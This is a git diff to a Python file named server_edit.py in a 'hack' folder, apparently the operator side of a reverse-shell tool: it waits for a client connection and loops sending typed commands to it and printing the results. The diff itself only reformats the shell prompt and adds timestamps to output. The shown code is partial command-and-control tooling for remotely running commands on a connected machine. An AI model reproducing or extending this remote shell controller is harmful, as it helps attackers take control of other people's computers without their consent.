@@ -2,7 +2,7 @@
 Author: hibana2077 hibana2077@gmail.com
 Date: 2024-06-04 11:00:21
 LastEditors: hibana2077 hibana2077@gmail.com
-LastEditTime: 2024-06-06 01:26:26
+LastEditTime: 2024-06-06 01:39:10
 FilePath: \hack\server_edit.py
 Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
 '''
@@ -10,6 +10,7 @@ import socket
 import json
 import base64
 import datetime
+import time
 from rich import print as rprint
 
 server_ip = "172.21.0.2"
@@ -64,7 +65,7 @@ rprint("[bold green]Client connected from:[/bold green]", client_address)
 
 # Communication loop
 while True:
-    command = input("* Shell#~%s: " % str(client_address))
+    command = input(f"* Shell#~{str(client_address)}: ")
     send_data(command, client_connection)
     if command == "q":
         break
@@ -99,9 +100,11 @@ while True:
     elif command.startswith("pwd"):
         result = receive_data(client_connection)
         rprint(f"[bold green]{result}[/bold green]")
+        rprint(f"[bold green]{datetime.datetime.now()}[/bold green]")
     else:
         result = receive_data(client_connection)
         rprint(result)
+        rprint(f"[bold green]{datetime.datetime.now()}[/bold green]")
 
 # Close connection
 rprint("[bold red]Connection closed[/bold red]")
